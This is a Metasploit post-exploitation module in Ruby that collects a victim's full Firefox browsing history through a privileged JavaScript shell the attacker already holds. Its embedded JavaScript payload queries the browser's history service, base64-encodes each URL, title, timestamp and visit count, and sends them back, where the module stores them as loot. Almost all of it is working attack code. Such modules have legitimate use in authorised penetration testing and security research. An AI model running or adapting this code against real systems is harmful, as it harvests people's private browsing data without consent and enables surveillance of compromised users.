##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Firefox Gather History from Privileged JavaScript Shell',
        'Description' => %q{
          This module allows collection of the entire browser history from a Firefox
          Privileged JavaScript Shell.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'joev' ],
        'DisclosureDate' => '2014-04-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])
    ])
  end

  def run
    results = js_exec(js_payload)
    if results.present?
      begin
        history = JSON.parse(results)
        history.each do |entry|
          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
        end

        file = store_loot('firefox.history.json', 'text/json', rhost, history.to_json)
        print_good("Saved #{history.length} history entries to #{file}")
      rescue JSON::ParserError
        print_warning(results)
      end
    end
  end

  def js_payload
    %|
      (function(send){
        try {
          var service = Components
                .classes["@mozilla.org/browser/nav-history-service;1"]
                .getService(Components.interfaces.nsINavHistoryService);
          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;

          var query = service.getNewQuery();
          var options = service.getNewQueryOptions();
          var result = service.executeQuery(query, options);
          var fields = [];
          var entries = [];

          var root = result.root;
          root.containerOpen = true;

          for (var i = 0; i < result.root.childCount; ++i) {
            var child = result.root.getChild(i);
            if (child.type == child.RESULT_TYPE_URI) {
              entries.push({
                uri: b64(child.uri),
                title: b64(child.title),
                time: b64(child.time),
                accessCount: b64(child.accessCount)
              });
            }
          }

          result.root.containerOpen = false;

          send(JSON.stringify(entries));
        } catch (e) {
          send(e);
        }
      })(this.send);
    |.strip
  end
end
